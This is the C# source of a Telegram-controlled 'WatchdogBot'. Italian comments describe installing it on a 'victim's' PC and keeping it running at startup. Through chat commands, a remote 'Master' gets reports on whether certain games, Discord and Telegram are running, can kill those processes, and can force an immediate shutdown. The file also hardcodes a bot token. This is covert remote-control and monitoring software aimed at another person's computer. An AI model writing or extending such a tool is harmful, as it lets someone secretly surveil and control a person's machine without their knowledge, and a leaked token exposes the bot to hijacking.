using System.Diagnostics;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

// cose da fare sul pc della vittima:
// 1- Clonare la repo di git
// 2- scaricare .NET 8 RunTime per console app --> https://builds.dotnet.microsoft.com/dotnet/Runtime/8.0.19/dotnet-runtime-8.0.19-win-x64.exe

// completare il comando stop (con slash o con bottone)
// finchè non è disponiblie lo stop, per chiudere WatchdogBot si può usare il Task Manager -->
// usa "ctrl + shift + esc" per aprire il Task Manager, clicca su dettagli, cerca "WatchdogBot.exe" e termina il processo

//provare a tenere watchdog bot sempre in esecuzione, quando il pc si accende

//mettere Launcher su git senza mettere la cartella Launcher dentro la cartella WatchdogBot

internal class Program
{
    static string green = "✅";
    static string red = "❌";

    static string BotToken = "8394532079:AAE77C008EiAFAVQR76__KnPQ4we9bTUTpQ"; // Token del bot
    static long PippoId = 6341619196;  // Telegram user ID

    static ITelegramBotClient botClient = new TelegramBotClient(BotToken);

    static async Task Main()
    {
        Console.WriteLine("Bot avviato. Attendere...");

        var cts = new CancellationTokenSource();

        var receiverOptions = new ReceiverOptions
        {
            AllowedUpdates = null // ricevi tutti gli aggiornamenti
        };

        botClient.StartReceiving(
            HandleUpdateAsync,
            HandleErrorAsync,
            receiverOptions,
            cancellationToken: cts.Token
        );

        var me = await botClient.GetMeAsync();
        Console.WriteLine($"Bot connesso come {me.Username}");

        await Task.Delay(-1);
    }

    static async Task HandleUpdateAsync(ITelegramBotClient bot, Update update, CancellationToken cancellationToken)
    {
        if (update.Message is not { Type: MessageType.Text } message)
            return;

        var text = message.Text!.ToUpperInvariant().Trim();
        var chatId = message.Chat.Id;
        Console.WriteLine($"Testo ricevuto: '{text}'");
        await bot.SendTextMessageAsync(chatId, $"Testo ricevuto: '{text}'");

        if (chatId != PippoId)
        {
            await bot.SendTextMessageAsync(chatId, "WHO ARE YOU?! I WILL TELL MY MASTER");
            await bot.SendTextMessageAsync(PippoId, $"Someone contacted me! Text: {message.Text}");
            return;
        }

        switch (text)
        {
            case "/START":
                var keyboard = new ReplyKeyboardMarkup(new[]
{
    new KeyboardButton[] { new KeyboardButton("KA") },
    new KeyboardButton[] { new KeyboardButton("U") },
    new KeyboardButton[] { new KeyboardButton("K FG") },
    new KeyboardButton[] { new KeyboardButton("KAR") },
    new KeyboardButton[] { new KeyboardButton("KONEM") },
    new KeyboardButton[] { new KeyboardButton("KTENS") },
    new KeyboardButton[] { new KeyboardButton("SD") },
    new KeyboardButton[] { new KeyboardButton("STOP") }
})
                {
                    ResizeKeyboard = true
                };

                await bot.SendTextMessageAsync(chatId, "Welcome back Master", replyMarkup: keyboard);
                break;

            case "STOP":  // aggiungi anche questo per accettare stop senza slash
                await bot.SendTextMessageAsync(chatId, "Bot in chiusura. Bye!");
                Environment.Exit(0);
                break;


            case "KA":
                KillAll();
                await bot.SendTextMessageAsync(chatId, ".");
                break;

            case "K FG":
                KillTelegram();
                KillFallGuys();
                KillFallGuysLauncher();
                await bot.SendTextMessageAsync(chatId, ".");
                break;

            case "U":
                await UpdateUser();
                break;

            case "SD":
                await bot.SendTextMessageAsync(chatId, "Shutting down. Bye Bye");
                ShutdownPc();
                break;

            case "KAR":
                KillAll();
                await bot.SendTextMessageAsync(chatId, ".");
                await bot.SendTextMessageAsync(chatId, "Reaction still not implemented");
                break;

            case "KONEM":
                await Task.Delay(60000);
                KillAll();
                await bot.SendTextMessageAsync(chatId, ".");
                break;

            case "KTENS":
                await Task.Delay(10000);
                KillAll();
                await bot.SendTextMessageAsync(chatId, ".");
                break;

            default:
                await bot.SendTextMessageAsync(chatId, "I don't understand...");
                break;
        }
    }

    static Task HandleErrorAsync(ITelegramBotClient bot, Exception exception, CancellationToken cancellationToken)
    {
        Console.WriteLine($"Errore: {exception.Message}");
        return Task.CompletedTask;
    }

    static async Task UpdateUser()
    {
        KillTelegram();
        await SendStatus("FL", "EpicGamesLauncher");
        await SendStatus("F", "FallGuys_client_game");
        await SendStatus("D", "Discord");
        await SendStatus("R", "RainbowSix");
    }

    static async Task SendStatus(string prefix, string processName)
    {
        bool running = IsProcessRunning(processName);
        string status = running ? green : red;
        await botClient.SendTextMessageAsync(PippoId, prefix + status);
    }

    static bool IsProcessRunning(string name)
    {
        return Process.GetProcessesByName(Path.GetFileNameWithoutExtension(name)).Any();
    }

    static void KillProcess(string name)
    {
        foreach (var proc in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(name)))
        {
            try { proc.Kill(); } catch { }
        }
    }

    static void KillFallGuys() => KillProcess("FallGuys_client_game");
    static void KillFallGuysLauncher() => KillProcess("EpicGamesLauncher");
    static void KillTelegram() => KillProcess("Telegram");
    static void KillDiscord() => KillProcess("Discord");
    static void KillRainbow6Siege() => KillProcess("RainbowSix");

    static void KillAll()
    {
        KillFallGuys();
        KillFallGuysLauncher();
        KillTelegram();
        KillDiscord();
        KillRainbow6Siege();
    }

    static void ShutdownPc()
    {
        var psi = new ProcessStartInfo("shutdown", "/s /t 0")
        {
            CreateNoWindow = true,
            UseShellExecute = false
        };
        Process.Start(psi);
    }
}
